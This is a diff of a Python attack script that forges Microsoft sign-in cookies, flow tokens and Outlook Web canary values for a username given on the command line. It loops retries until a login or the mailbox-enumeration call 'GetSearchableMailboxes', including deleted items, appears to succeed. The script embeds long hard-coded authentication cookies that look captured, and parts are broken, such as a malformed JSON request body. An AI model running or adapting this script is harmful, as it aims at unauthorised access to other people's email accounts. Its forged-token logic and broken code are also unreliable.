@@ -1,12 +1,57 @@
 import sys
 import uuid
+import binascii, codecs
 import random, base64
 import requests
+import time
 
 from urllib import parse as urlencode
 from bs4 import BeautifulSoup
 
-username = sys.argv[1]
+
+def client_id():
+    return codecs.decode(binascii.hexlify(random.randbytes(16)))
+
+def cookie_as():
+    return base64.b64encode(random.randbytes(44))
+
+def routing_key_cookie():
+    return base64.b64encode(random.randbytes(32))
+
+def mailboxUser():
+    return str(uuid.uuid4())
+
+def cookie_uc():
+    return codecs.decode(binascii.hexlify(random.randbytes(16)))
+
+def open_id_connect_token():
+    return base64.b64encode(random.randbytes(1908))
+
+def owa_redirect_history():
+    o1 = base64.b64encode(random.randbytes(14))
+    o2 = base64.b64encode(random.randbytes(14))
+    o3 = base64.b64encode(random.randbytes(14))
+    return o1.decode()+'|'+o2.decode()+'|'+o3.decode()
+
+def owa_canary():
+    return base64.b64encode(random.randbytes(55))
+
+def service_suite_proxy_key():
+    p1 = base64.b64encode(random.randbytes(32))
+    p2 = base64.b64encode(random.randbytes(16))
+    return p1.decode()+'&'+p2.decode()
+
+def outlook_session():
+    return codecs.decode(binascii.hexlify(random.randbytes(16)))
+
+def default_anchor_mailbox():
+    return codecs.decode(binascii.hexlify(random.randbytes(8)))+'@'+str(uuid.uuid4())
+
+def opt_in_h():
+    return base64.b64encode(random.randbytes(31))
+
+def x_owa_session_id():
+    return str(uuid.uuid4())
 
 #Create Flow Token
 def flowToken():
@@ -27,26 +72,23 @@ def authCode():
     b64_token = enc_token.decode()
     return b64_token.split('=')[0].replace('+', '_').replace('/', '-')
 
-def mailboxUser():
-    return str(uuid.uuid4())
-
 def mailboxDomain():
     return str(uuid.uuid4())
 
 def client_Id():
     return str(uuid.uuid4())
 
-try:
+username = sys.argv[1]
+domainName = username.split('@')[1]
+
+while True:
     fT = flowToken()
     oReq = origRequest()
     n = random.randint(13, len(fT)-12)
     fToken = fT[n:]+'--'+fT[:n+random.randint(n, len(fT))]+'__'+oReq[:n-random.randint(n, len(fT))]
-
     code = authCode()
     n = random.randint(13, len(code)-12)
     enc_code = '0.'+code[n:]+'.'+code[:n]+'--'+code[:n+random.randint(n, len(code))]
-
-
     
     #Forge Cookie
     clrc= urlencode.quote('{"19010":["YLxB1kPp"],"19018":["h5ROdrbP","RjrhuE3a"]}')
@@ -107,11 +149,18 @@ try:
                                                                                                timeout=10,
                                                                                                verify=True)
 
-    print('===================================================================================================')
-    print(rp.url)
-    print(rp)
-    print('===================================================================================================')
-    print(rp.content)
+    if b'error' in rp.content:
+        print('Error!  Invalid Correlation ID!')
+        pass
+    else:
+        print('===================================================================================================')
+        print(rp.url)
+        print(rp)
+        print('===================================================================================================')
+        print(rp.content)
+        break
+
+    time.sleep(3)
     
     canary = 'yUKHoes/+TP7ue9vGKbs0QxDiEpr/LCcvHoY+24R8l4=0:1'
     canary_enc = urlencode.quote(canary)
@@ -145,7 +194,6 @@ try:
         &i2=102&i17=&i18=&i19=19875
     ''' % (username, username, canary, oReq, fToken)
 
-
     cookie = 'brcap=0; ESTSAUTHPERSISTENT=%s; ch=q90jpLY4NKjVzRQ5NRAq-BMIRFu-xGsiMixjzqNS7ug; MSFPC=GUID=7a50db6543fc43df9a8812b47f5ba092&HASH=7a50&LV=202104&V=4&LU=1617718897604; buid=0.AQgAnoxqczZLxU6KmmD3k_9H8_fhvoluXopNnz3s1gElnacIAP4.AQABAAEAAAD--DLA3VO7QrddgJg7WevrFZdb48d3NfGirI6tETvozcWRpIzwUFmwt-pi9nZjUqjAwEhpP2nt7SGxFfwpd3uVm7jMoD-gWAwbI96YFf5inJ2TM5VgCUC-nGpZpEP3mkVg8_H-fMpzWq-ifmz-2lkB5Nh7EHRnD9_ju80SwdkvrtOSD5UmC6TF3wpqMvvgqMEgAA; fpc=AkfbZsCDxDVNnqHotEM6aVGerOTJAgAAANcXgtkOAAAA; clrc=%s wlidperf=FR=L&ST=1643127052230; CCState=Q29nQkNpQmtaV0p5WVhOb1pYSTRNVGswUUhOMGRXUmxiblJ6TG5WaGNIUmpMbVZrZFJJQkFTSUpDWUFrSDMrNm90bElNaW9LRWdvUUFnQUFBQUFBOFEvT0FBQUFBQUFBQUJJSkNWR2VYeE1nNGRsSUdna0pPczhGUjhYZTJVZzRBRWdBVWhJS0VKNk1hbk0yUzhWT2lwcGc5NVAvUi9OYUVnb1FINEhMbks3WUUwYStZeWdQcjkwc0pCSVNDaENOWnFVc3doNjJSSmtqN1ZVSnJsK1NHZ2tKT3M4RlI4WGUyVWdpZWdFQUFRQUJBQUFBL3ZneXdOMVR1MEszWFlDWU8xbnI2eDR3eTRzZlEwbWhCTW9MQlV0TWNuZXpTNmNGS2xHQ1VGMVF4RFNTSE1TeSs2cld2M1ViOWo2Vnd4c2xoQkNFMmhNZ08xTlRIcU1lU0Qva3JoRGwvYms0V3U1WGFhQnhmekxYU3hYdlBLWmhlcUx3dlpMNnJ2UHo2Tk8xeGdRYjFpQUFLb0FHQVFBQkFBRUFBQURmWUVUc1RUWGp6MEhzTFh3RFlRSVBNSUlCNGdZSktvWklodmNOQVFjRG9JSUIwekNDQWM4Q0FRQXhnZ0Y3TUlJQmR3SUJBREJmTUVzeEN6QUpCZ05WQkFZVEFsVlRNUlV3RXdZRFZRUUtFd3hFYVdkcFEyVnlkQ0JKYm1NeEpUQWpCZ05WQkFNVEhFUnBaMmxEWlhKMElFTnNiM1ZrSUZObGNuWnBZMlZ6SUVOQkxURUNFQWR1bzgyZklEQ2cxcGNYV2hyNmp3UXdEUVlKS29aSWh2Y05BUUVCQlFBRWdnRUFjRVRKY1NMSU43MDRzNTNQNDlyVlNnUE9uTzlscmRYNUJ6aDFaQ2VBSnRQTkJVNzc0Z1lrTy9ScVdDVWhaWUQ3b2huZmZMeEprVG9sSjZ4M3ltSEsvKzRvdTBIMU11LzFXUlpLcVJRVytTUGRxeEdiT25LbUtHM0RMTThzL2VsQmpCSy9hTDdGa3BDU1BHOStkaDVOdHdwV1RubER4YjdwU2NBRHpRWVBDOVdRVVF5ajBBcTVhWTZ6bHpQL3czMVVubWJRanhRK2pZa3g4cFhDUWxJOU9CSGt3TnZEazBvb25ZaXVtQ2R0Z1dZOEd1N0Jia3ljNFRtbjlOeWcxS2lEOGtaTU9tekxia3dzWHFxeWtrelJtTnNNN0dCK3FKK3RVRHBET3paSVQ0OTNGMXpxME5ncHovWk91ZVRtc2YvUVBWYmFCZ29QR282cHN3S2kyK0YwZXpCTEJna3Foa2lHOXcwQkJ3RXdGQVlJS29aSWh2Y05Bd2NFQ0M1RUhERmJOZWZhZ0Nqa3p2VWJpOHJvL1ZHZUNxaDNDcWhaVnYvRGFzb3h5WW02TlJqdmtFdlRtY001SVRqRVFFdGFlbG5mSXEwZUwwTUlHRFVTZlRCTGFjckJURUhlT2ljczEyWTNDSFlkQkxCSWszaU9RMU1CQTZiWU1uVlJYUUNGdFl4VnJDLytQMFBBTmF2VDcxLzBxNnlJamJSY1dmQm9UbHJSZDl5ZHM3cmQ2NWJyWm4zSFhVV0hrbnNaQmJ4V2FsTVlpc2Z0M0ZBMzdSdHR3NVVDcmRSSjZ3dzc3dXdiT3pPZFpyeE1za1F2VnNRTVY3R3RFZUk2ZTNTY0N5dTJCMEFPNFA4SGhDbVV5bThDSnpkcExGSUlsazE1V1VYZEVrWWp3dzM3bEdNVDQ1b3ZqMXQ4YlJXZjR4UHpMTkFKaVYvTFFvc3EzMmhNczJKZVJlRVJERGFhOTFNNUlESHRleUF5Y3ZlNVVWMGk4RFhnVEY3RGpBL0hjN2ErYjU3QUZ1RFFJY29SWlM0TlpZMlNvbWlmM3dBQg==; ESTSAUTH=0.AQgAnoxqczZLxU6KmmD3k_9H8_fhvoluXopNnz3s1gElnacIAP4.AgABAAQAAAD--DLA3VO7QrddgJg7WevrAgDs_wQA9P_UR_BTn7MKIxZpRufTBfXUenzf6WRsfNkYIph8G359aqC5_ZZ10dLC09FoM3RVASMjW8U3yKMi0A; ESTSAUTHLIGHT=+; ESTSSC=00; esctx=AQABAAAAAAD--DLA3VO7QrddgJg7WevrFjIuQb4miTDwgVfQNxLCzZZ4OP6aPlUZF4oxt8alTWgGq__mScD05ntY1li2kLMT1Gf2mG1Vc9v59rXOWec2-NpsnDLhXuWmTvC2vS4jKIqAMkg3Uy_v5MT03Wo56JLfe9CWEFuZYqixGv-NJNPCFPl_-zmNVRndb3ol4xpC6rQgAA; x-ms-gateway-slice=estsfd; stsservicecookie=estsfd' % (enc_code, clrc)
 
     headers = {'Host': 'login.microsoftonline.com',
@@ -172,13 +220,20 @@ try:
                                                                          timeout=10, 
                                                                          verify=True)
 
-    page = BeautifulSoup(rp.content, 'html.parser')
+    #page = BeautifulSoup(rp.content, 'html.parser')
 
-    print('===================================================================================================')
-    print(rp.url)
-    print(rp)
-    print('===================================================================================================')
-    print(page)
+    if b'Sorry' in rp.content:
+        print('Invalid request! Could not sign in!')
+        pass
+    else:
+        print('===================================================================================================')
+        print(rp.url)
+        print(rp)
+        print('===================================================================================================')
+        print(rp.content)
+        break
+
+    time.sleep(3)
 
     clientId = client_Id()
     mbUser = mailboxUser()
@@ -230,16 +285,108 @@ try:
                                                                                             timeout=2, 
                                                                                             verify=True)
 
-    page = BeautifulSoup(rp.content, 'html.parser')
+    #page = BeautifulSoup(rp.content, 'html.parser')
+    if b'error' in rp.content:
+        print('Error!  Invalid Token!')
+        pass
+    else:
+        print('===================================================================================================')
+        print(rp.url)
+        print(rp)
+        print('===================================================================================================')
+        print(rp.content)
+        break
 
-    print('===================================================================================================')
-    print(rp.url)
-    print(rp)
-    print('===================================================================================================')
-    print(page)
-    
-except requests.ConnectionError as e:
-    print(e)
+    time.sleep(3)
 
-except requests.ConnectTimeout as t:
-    print(t)
+    #Forge Cookie
+    clientId = client_id()
+    mbUser = mailboxUser()
+    c_uc = cookie_uc()
+    c_as = cookie_as()
+    rkc = routing_key_cookie()
+    x_owa_redirecthistory = owa_redirect_history()
+    openIdConnectToken = open_id_connect_token()
+    owaCanary = owa_canary()
+    outlookSession = outlook_session()
+    defaultAnchorMailbox = default_anchor_mailbox()
+    optInH = opt_in_h()
+    sspk = service_suite_proxy_key()
+    xOwaSessionId = x_owa_session_id()
+
+    routingKeyCookie = 'v2:'+rkc.decode().split('=')[0]+':%s@%s' % (mbUser, domainName)
+    enc_routingKeyCookie = urlencode.quote(routingKeyCookie)
+    n = random.randint(13, len(owaCanary)-12)
+    canary = owaCanary[:n].decode()+'-'+owaCanary[n:].decode().split('=')[0]
+    i = random.randint(13, len(optInH)-12)
+    optIn = optInH[:i].decode()+'-'+optInH[i:].decode().split('=')[0]
+    cookie = 'ClientId=%s; OIDC=1; as=%s; RoutingKeyCookie=%s; OptInH=%s; UC=%s; X-OWA-RedirectHistory=%s; DefaultAnchorMailbox=%s; O365Consumer=0; OpenIdConnect.token.v1=%s; domainName=%s; SuiteServiceProxyKey=%s; X-OWA-CANARY=%s; OutlookSession=%s' % (clientId, c_as.decode().split('=')[0], enc_routingKeyCookie, optIn, c_uc, x_owa_redirecthistory, defaultAnchorMailbox, openIdConnectToken.decode().split('=')[0], domainName, sspk, canary, outlookSession)
+
+    #Craft JSON
+    json = '''
+        {
+            "__type":"GetSearchableMailboxesJsonRequest:#Exchange",
+            "Header":{
+                "__type":"JsonRequestHeaders:#Exchange",
+                "RequestServerVersion":"V2017_08_18",
+            },
+            "Body":{
+                "__type":"GetSearchableMailboxesRequest:#Exchange",
+                "SearchableMailboxes",
+                "ReturnSubmittedItems":true,
+                "ReturnDeletedItems":true
+            }
+        }
+    '''
+
+    #Craft Headers
+    headers = {'Host': 'outlook.office.com',
+            'Cookie': cookie,
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Content-Type': 'application/json; charset=utf-8',
+            'Content-Length': '%s' % str(len(json)),
+            'Action': 'GetSearchableMailboxes',
+            'Ms-Cv': 'QZKMaqF1/ZT3S5/xatpTfJ.31',
+            'X-Owa-Canary': canary,
+            'X-Owa-Correlationid': '',
+            'X-Owa_Sessionid': xOwaSessionId,
+            'Referer': 'https://webshell.suite.office.com/',
+            'X-Req-Source': 'Mail',
+            'Origin': 'https://outlook.office.com',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'Te': 'trailers'}
+
+    try:
+        #Send Request
+        rp = requests.post('https://outlook.office.com/owa/service.svc?action=GetSearchableMailboxes&app=Mail&n=31', data=json,
+                                                                                                                    headers=headers,
+                                                                                                                    timeout=10,
+                                                                                                                    verify=True)
+        if rp.status_code == 200:
+            print('=========================================================================================')
+            print(rp.url)
+            print('=========================================================================================')
+            print(rp)
+            print('=========================================================================================')
+            print(headers)
+            print('=========================================================================================')
+            print(rp.content)
+            break
+
+        else:
+            print('Unauthorized!  Connection Failed!')
+            pass
+
+        time.sleep(3)
+
+    #Handle Exceptions
+    except requests.ConnectionError as e:
+        print(e)
+
+    except requests.ConnectTimeout as t:
+        print(t)
